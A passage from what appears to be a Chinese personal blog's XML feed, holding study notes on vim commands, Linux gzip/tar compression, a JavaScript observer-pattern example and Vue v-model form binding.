      <url>/categories/Linux/Linux%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux%E4%BD%BF%E7%94%A8%EF%BC%9Avim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h5 id="多文件编辑"><a href="#多文件编辑" class="headerlink" title="多文件编辑"></a>多文件编辑</h5><p>操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c <span class="comment">#c 是“修改(change)”（即删除后进入插入模式），后面可以接一个移动命令</span></span><br><span class="line">cw  <span class="comment">#删除一个单词并进入插入模式</span></span><br><span class="line">c2w 或者 2cw  <span class="comment">#删除两个单词并进入插入模式</span></span><br><span class="line"></span><br><span class="line">ctrl + h/w/u   <span class="comment">#删除前一个字符，前一个单词，前一行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w/W   <span class="comment">#下一个单词开头</span></span><br><span class="line">e/E   <span class="comment"># 下一个单词结尾 </span></span><br><span class="line">b/B     <span class="comment">#上一个单词开头</span></span><br><span class="line">0/^    <span class="comment"># 行头</span></span><br><span class="line">$/g_  <span class="comment">#  行末</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#区块操作( visual block )</span></span><br><span class="line">v V  ctrl+v  y p</span><br><span class="line">-------</span><br><span class="line"></span><br><span class="line"><span class="comment">#文本还原为打开时的文件</span></span><br><span class="line">:e!</span><br><span class="line"><span class="comment">#打开新文件</span></span><br><span class="line">:e &lt;path/to/file&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">#文件切换</span></span><br><span class="line">vim hosts /etc/hosts</span><br><span class="line">:n</span><br><span class="line">:N</span><br><span class="line">:files</span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line"><span class="comment">#多窗口1</span></span><br><span class="line">vim -o/O [file1] [file2]   <span class="comment">#o后面可以加数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#多窗口2</span></span><br><span class="line">:sp &#123;otherfilename&#125;</span><br><span class="line">:vsp &#123;otherfilename&#125;</span><br><span class="line">[ctrl]+w+j    [ctrl]+w+k</span><br><span class="line">[ctrl]+w+r  <span class="comment">#位置交换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#新建窗口</span></span><br><span class="line">:split</span><br><span class="line">:vsplit</span><br><span class="line"></span><br><span class="line"><span class="comment">#新开打开相同文件</span></span><br><span class="line">[ctrl]+w+s</span><br></pre></td></tr></table></figure><h5 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,<span class="variable">$s</span><span class="regexp">/word1/</span>word2/g 或</span><br><span class="line">:<span class="number">1</span>,<span class="variable">$s</span><span class="regexp">/word1/</span>word2/gc （需要使用者确认）</span><br></pre></td></tr></table></figure><h5 id="文字补齐"><a href="#文字补齐" class="headerlink" title="文字补齐"></a>文字补齐</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[ctrl]</span>+x+n    文件的内容文字</span><br><span class="line"><span class="string">[ctrl]</span>+x+f     当前目录的文件名</span><br><span class="line"><span class="string">[ctrl]</span>+x+o   vim内置的关键字</span><br></pre></td></tr></table></figure><h5 id="写过的命令记录"><a href="#写过的命令记录" class="headerlink" title="写过的命令记录"></a>写过的命令记录</h5><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.viminfo</span><br></pre></td></tr></table></figure><h5 id="环境设置参数"><a href="#环境设置参数" class="headerlink" title="环境设置参数"></a>环境设置参数</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nu</span>,nonu,hlsearch,nohlsearch,autoindent,noautoindent,backup,nobackup,ruler,showmode,backspace(<span class="number">0</span>/<span class="number">1</span>/<span class="number">2</span>),<span class="literal">all</span>,syntax <span class="literal">on</span>/<span class="literal">off</span>,bg=dark/light</span><br></pre></td></tr></table></figure><img src="#tva3.sinaimg.cn/large/005zbIM7ly1g5azdfj5czj30me0eb0yt.jpg" alt="img">##### 配置文件 `~/.vimrc`和`/etc/vimrc`&emsp;&emsp;最好再修改`~/.vimrc`文件(需先创建)<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;文件内容</span></span><br><span class="line"><span class="string">set hlsearch &quot;</span>高亮度反白</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">backspace</span>=2 <span class="string">&quot;可随时用倒退键删除</span></span><br><span class="line"><span class="string">set autoindent &quot;</span>自动缩排</span><br><span class="line"><span class="builtin-name">set</span> ruler <span class="string">&quot;可显示最后一列的状态</span></span><br><span class="line"><span class="string">set showmode &quot;</span>左下角那一列的状态<span class="builtin-name">set</span> nu <span class="string">&quot;可以在每一列的最前面显示行号啦！</span></span><br><span class="line"><span class="string">set bg=dark &quot;</span>显示不同的底色色调</span><br><span class="line">syntax on <span class="string">&quot;进行语法检验，颜色显示。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="builtin-name">set</span> by K</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">ts</span>=4</span><br><span class="line"><span class="builtin-name">set</span> expandtab</span><br><span class="line"><span class="builtin-name">set</span> autoindent</span><br></pre></td></tr></table></figure>##### 编码问题- 配置文件 `/etc/locale.conf`- bash的语系:`LANG,LC_ALL`  - `LANG=zh_TW.big5` 台湾big5？  - `export LC_ALL=zh_TW.big5`- 文件的编码- 打开终端机的软件(主要是它和文件编码是否一致)<br> `utf8` 和 `big5`##### 编码转换9.4.3<h5 id="DOS-与-Linux-的断行字符"><a href="#DOS-与-Linux-的断行字符" class="headerlink" title="DOS 与 Linux 的断行字符"></a>DOS 与 Linux 的断行字符</h5><p><strong>enter</strong>:<br>在windows创建的文件的换行：CR与LF  （^M$）<br>Linux:LF  ($)<br><br><strong>解决办法：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过光盘安装需要的软件：</span></span><br><span class="line">su   <span class="comment">#用户为root</span></span><br><span class="line">mount <span class="regexp">/devsr0 /m</span>nt    <span class="comment">#挂载</span></span><br><span class="line">rpm -ivh <span class="regexp">/mnt/</span>Packages/dos2unix-*</span><br><span class="line"><span class="comment">#.......</span></span><br><span class="line">unmount /mnt</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment">#--------------</span></span><br><span class="line"><span class="comment">#判断是什么断行</span></span><br><span class="line">file [file]</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用</span></span><br><span class="line">dos2unix [-kn] file [newfile]</span><br><span class="line">unix2dos [-kn] file [newfile]</span><br><span class="line"><span class="comment"># -k: 不改时间</span></span><br><span class="line"><span class="comment"># -n:保留旧文件，输出新文件到newfile</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux基础教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
            <tag> 命令 </tag>
            
            <tag> 鸟哥私房菜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用：文件与文件系统的压缩、打包与备份</title>
      <link href="/categories/Linux/Linux%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux%E4%BD%BF%E7%94%A8%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8E%8B%E7%BC%A9%E3%80%81%E6%89%93%E5%8C%85%E4%B8%8E%E5%A4%87%E4%BB%BD/"/>
      <url>/categories/Linux/Linux%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux%E4%BD%BF%E7%94%A8%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8E%8B%E7%BC%A9%E3%80%81%E6%89%93%E5%8C%85%E4%B8%8E%E5%A4%87%E4%BB%BD/</url>
      
        <content type="html"><![CDATA[<h4 id="8-2-Linux系统的压缩指令"><a href="#8-2-Linux系统的压缩指令" class="headerlink" title="8.2 Linux系统的压缩指令"></a>8.2 Linux系统的压缩指令</h4><p>&emsp;&emsp;压缩文件扩展名:<code>*.tar,*.tar.gz,*.tgz,*.gz,*.Z,*.xz</code><br><br>&emsp;&emsp;一般需要先用<code>tar</code>将许多文件打包成一个文件，再进行压缩。(因为<code>gzip</code>、<code>bzip2</code>、<code>xz</code>一次只能针对一个文件来压缩和解压缩)。</p><ul><li><code>gzip</code><ul><li>后缀：<code>*.gz</code></li><li>可以解开：<code>compress,zip,gzip</code>压缩的文件(<code>*.Z,*.zip,*.gz</code>)</li><li><code>gzip [-cdtv#]</code> 文件名<ul><li><code>-c</code>:将压缩的数据输出到屏幕上</li><li><code>-d</code>:解压缩的参数</li><li><code>-t</code>:检验压缩文件的一致性（压缩文件是否错误）</li><li><code>-v</code>:显示压缩比信息</li><li><code>-#</code>:压缩等级，-1最快，压缩比最差，默认-6</li></ul></li><li>！压缩后原文件不存在了</li><li>范例<ul><li><code>ls -ldSr /etc/*</code>  只显示目录，从小到大排序</li><li><code>gzip -v &#123;filename&#125;</code></li><li><code>zcat/zmore/zless &#123;*.gz&#125;</code> 查看解压缩后的文件内容</li><li><code>gzip -d &#123;*.gz&#125;</code>  解压缩后删除压缩文件</li><li><code>gzip -9 -c &#123;filename&#125; &gt; &#123;*.gz&#125;</code> (最好的压缩比)压缩并保留原文件</li><li><code>zgrep -n &#39;&#123;find_word&#125;&#39; &#123;*.gzip&#125;</code>  查找压缩文件中，字符在第几行 </li></ul></li></ul></li><li><code>bzip2</code>  <code>-k</code> 保留原始文件<span id="more"></span></li><li><code>xz</code>  <code>-k</code>  保留原始文件</li><li>比较三个压缩命令压缩时间<br>  <code>  time [gzip|bzip2|xz] -c services &gt; services.[gz|bz2|xz]  </code></li></ul><h4 id="tar-打包指令"><a href="#tar-打包指令" class="headerlink" title="tar 打包指令"></a>tar 打包指令</h4><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g5avw99bzhj30jj0ajwjf.jpg" alt="img">- 打包与压缩 `tar [-z|-j|-J][cv] [-f 待创建的新文件名] filename` - 查看打包文件里的文件名 `tar [-z|-j|-J][tv] [-f 既有的tar文件名]`- 解压缩  `tar [-z|-j|-J][xv] [-f 既有的tar文件名] [-C 目录]`- 范例  - 备份 `/etc`目录： `time tar -zpcv -f /root/etc.tar.gz  /etc`，最好不要有 `-v`，这样解压的时候不会默认覆盖了(保存了绝对路径)]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux基础教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
            <tag> 命令 </tag>
            
            <tag> 鸟哥私房菜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载1-JavaScript设计模式-观察者模式</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E8%BD%AC%E8%BD%BD1-javascript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E8%BD%AC%E8%BD%BD1-javascript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>观察者模式也可以称为订阅模式，是一种从发布，到订阅，再到通知的过程。</p><h4 id="什么是观察者模式？"><a href="#什么是观察者模式？" class="headerlink" title="什么是观察者模式？"></a>什么是观察者模式？</h4><p>&emsp;&emsp;观察者模式定义了一个对象一对多的关系，让多个观察者同时监听一个大对象，当一个大对象发生变化时，所有依赖它的对象都会得到通知。</p><h4 id="观察者模式的过程"><a href="#观察者模式的过程" class="headerlink" title="观察者模式的过程"></a>观察者模式的过程</h4><p>&emsp;&emsp;五个模块：发布者，发布列表，增加订阅者，发布消息，订阅者收到订阅消息。</p><ul><li><p>发布者</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj=&#123;&#125;   <span class="comment">//发布者</span></span><br></pre></td></tr></table></figure></li><li><p>发布列表</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.list=[]  <span class="regexp">//</span>发布列表</span><br></pre></td></tr></table></figure><span id="more"></span></li><li><p>增加订阅者</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj.listen=function(<span class="built_in">key</span>,fn)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.list[<span class="built_in">key</span>])&#123;</span><br><span class="line">        <span class="keyword">this</span>.list[<span class="built_in">key</span>]=[];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.list[<span class="built_in">key</span>].push(fn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//fn 作为回调函数，作为传入订阅者的消息。</span></span><br><span class="line"><span class="comment">//key值作为每个订阅者订阅的不同商品，相同的放在一起。</span></span><br></pre></td></tr></table></figure></li><li><p>发布消息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">obj.message=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> key=<span class="built_in">Array</span>.prototype.shift.all(<span class="built_in">arguments</span>);  <span class="comment">//取出消息类型名称，这里是红色</span></span><br><span class="line">    <span class="keyword">var</span> fns=<span class="built_in">this</span>.list[key];</span><br><span class="line">    <span class="keyword">if</span>(!fns || fns.length == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(key + <span class="string">&quot;还没有上货，请耐心等待...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>,fn;fn=fns[i++];)&#123;</span><br><span class="line">        fn.apply(<span class="built_in">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>订阅者接收消息</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj.<span class="built_in">listen</span>(<span class="string">&quot;红色&quot;</span>,<span class="built_in">functon</span>(size)&#123;    <span class="comment">//订阅者</span></span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">&quot;尺寸：&quot;</span>+size);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.<span class="built_in">message</span>(<span class="string">&quot;黑色,40&quot;</span>);</span><br><span class="line">obj.<span class="built_in">message</span>(<span class="string">&quot;红色&quot;</span>,<span class="number">40</span>);</span><br><span class="line"><span class="comment">//黑色还没用上货，请耐心等待...</span></span><br><span class="line"><span class="comment">//尺寸：40</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6-表单与v-model</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/6-%E8%A1%A8%E5%8D%95%E4%B8%8Ev-model/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/6-%E8%A1%A8%E5%8D%95%E4%B8%8Ev-model/</url>
      
        <content type="html"><![CDATA[<h4 id="6-1-2-基本用法-绑定值"><a href="#6-1-2-基本用法-绑定值" class="headerlink" title="6.1+2 基本用法+绑定值"></a>6.1+2 基本用法+绑定值</h4><p>v-model，用于在表单类元素上双向绑定数据</p><ul><li>输入框<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span>  或者 <span class="selector-tag">textarea</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;message&quot;</span>]</span><span class="selector-attr">[placeholder=<span class="string">&quot;输入...&quot;</span>]</span></span><br><span class="line">data:&#123;message:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">+++++++++++++++++++++++++++++</span><br><span class="line"><span class="selector-tag">textarea</span><span class="selector-attr">[v-model=text]</span><span class="selector-attr">[placeholder=<span class="string">&quot;输入...&quot;</span>]</span></span><br><span class="line">data:&#123;message:<span class="string">&#x27;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>其他：<ul><li>使用v-model后，表单控件显示的值不再关心初始化时的<code>value</code>属性.</li><li>如果希望在拼音阶段实时更新数据，应该用<code>@input</code>替代<code>v-model</code></li></ul></li><li>单选按钮<span id="more"></span><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bind:chekced=true/false</span></span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;radio&quot;</span>]</span><span class="selector-attr">[:checked=<span class="string">&quot;picked&quot;</span>]</span></span><br><span class="line">    </span><br><span class="line">    <span class="selector-tag">data</span>:&#123;checked:true&#125;</span><br><span class="line">++++++++++++++++++++++++</span><br><span class="line"><span class="comment">//v-model 和 data的变量名 ； id 和 label-for ; v-model=true/false    value=?</span></span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;radio&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;picked&quot;</span>]</span><span class="selector-attr">[value=<span class="string">&quot;html&quot;</span>]</span><span class="selector-attr">[id=<span class="string">&quot;html&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-attr">[for=<span class="string">&quot;html&quot;</span>]</span>&#123;<span class="selector-tag">HTML</span>&#125;</span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;radio&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;picked&quot;</span>]</span><span class="selector-attr">[value=<span class="string">&quot;js&quot;</span>]</span><span class="selector-attr">[id=<span class="string">&quot;js&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-attr">[for=<span class="string">&quot;js&quot;</span>]</span>&#123;<span class="selector-tag">javascript</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="selector-tag">data</span>:&#123;checked:&quot;js&quot;&#125;</span><br><span class="line">++++++++++++++++++++++++</span><br><span class="line"><span class="comment">//绑定值     v-model=true/false   :value=?</span></span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;radio&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;picked_bind&quot;</span>]</span><span class="selector-attr">[:value=<span class="string">&quot;value_bind&quot;</span>]</span></span><br><span class="line">    </span><br><span class="line">    <span class="selector-tag">data</span>:&#123;picked_bind:false,value_bind:123&#125;</span><br></pre></td></tr></table></figure></li><li>复选框<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v-model=checked  true/false</span></span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;checkbox&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;checked&quot;</span>]</span><span class="selector-attr">[id=<span class="string">&quot;checked&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-attr">[for=checked]</span>&#123;打勾或者不打勾&#125;</span><br><span class="line">    </span><br><span class="line">    data:&#123;checked:true&#125;</span><br><span class="line">++++++++++++++++++++++++++++</span><br><span class="line"><span class="comment">//和多个单选按钮的区别在于 变量的数据类型是数组</span></span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;checkbox&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;checked&quot;</span>]</span><span class="selector-attr">[value=<span class="string">&quot;html&quot;</span>]</span><span class="selector-attr">[id=<span class="string">&quot;html&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-attr">[for=<span class="string">&quot;html&quot;</span>]</span>&#123;HTML&#125;</span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span><span class="selector-attr">[v-model=<span class="string">&quot;checked&quot;</span>[value=<span class="string">&quot;js&quot;</span>]</span><span class="selector-attr">[id=<span class="string">&quot;js&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-attr">[for=<span class="string">&quot;js&quot;</span>]</span>&#123;JavaScript&#125;</span><br><span class="line">    </span><br><span class="line">    data:&#123;checked:<span class="selector-attr">[<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;js&#x27;</span>]</span>&#125;</span><br><span class="line">+++++++++++++++++++++++++++++</span><br><span class="line"><span class="comment">//勾选与未勾选绑定值（貌似不能默认勾选）  keyword:  :true-value   :false-value</span></span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;checkbox&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;toggle&quot;</span>]</span><span class="selector-attr">[:true-value:value1]</span><span class="selector-attr">[:false-value:value2]</span></span><br><span class="line">    </span><br><span class="line">    data:&#123;toggle:false,value1:<span class="number">99</span>,value2:<span class="number">88</span>&#125;</span><br></pre></td></tr></table></figure></li><li>选择列表<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单选  option有value值，会优先匹配value,没有会直接匹配text值</span></span><br><span class="line">    <span class="selector-tag">select</span><span class="selector-attr">[v-model=<span class="string">&quot;selected&quot;</span>]</span></span><br><span class="line">        <span class="selector-tag">option</span>&#123;<span class="selector-tag">html</span>&#125;</span><br><span class="line">        <span class="selector-tag">option</span><span class="selector-attr">[value=<span class="string">&quot;js&quot;</span>]</span>&#123;<span class="selector-tag">javascript</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="selector-tag">data</span>&#123;selected:&#x27;html&#x27;&#125;</span><br><span class="line"><span class="comment">//多选   multiple  ,  数据类型也是数组</span></span><br><span class="line">    <span class="selector-tag">select</span><span class="selector-attr">[v-model=<span class="string">&quot;selected&quot;</span>]</span><span class="selector-attr">[multiple]</span></span><br><span class="line">        <span class="selector-tag">option</span>&#123;<span class="selector-tag">html</span>&#125;</span><br><span class="line">        <span class="selector-tag">option</span><span class="selector-attr">[value=<span class="string">&quot;js&quot;</span>]</span>&#123;<span class="selector-tag">javascript</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="selector-tag">data</span>:<span class="selector-attr">[<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;js&#x27;</span>]</span></span><br><span class="line"><span class="comment">//绑定值</span></span><br><span class="line"><span class="selector-tag">select</span><span class="selector-attr">[v-model=<span class="string">&quot;selected&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">option</span><span class="selector-attr">[:value=<span class="string">&quot;&#123;number:123&#125;&quot;</span>]</span>&#123;<span class="selector-tag">123</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><p>问题：复选框绑定值时候的初值是false，并且不能默认处于勾选状态？</p><p>6.3 <code>v-model</code> 修饰符</p><ul><li><p><code>.lazy</code></p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//使用 lazy,会转变为在 change 事件中同步 (写完，点一下外面)</span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span><span class="selector-attr">[v-model.lazy=<span class="string">&quot;message&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">p</span>&#123;&#123;&#123;message&#125;&#125;&#125;</span><br><span class="line">    </span><br><span class="line">    data:&#123;message:<span class="string">&#x27;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>number</code></p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//输入框输入时，默认时 string 类型，需要用 修饰符 转换为数字格式</span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;number&quot;</span>]</span><span class="selector-attr">[v-model.number=<span class="string">&quot;message&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">p</span>&#123;&#123;&#123;typeof message&#125;&#125;&#125;</span><br><span class="line">    </span><br><span class="line">    data:&#123;message:<span class="number">123</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>.trim</code> </p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 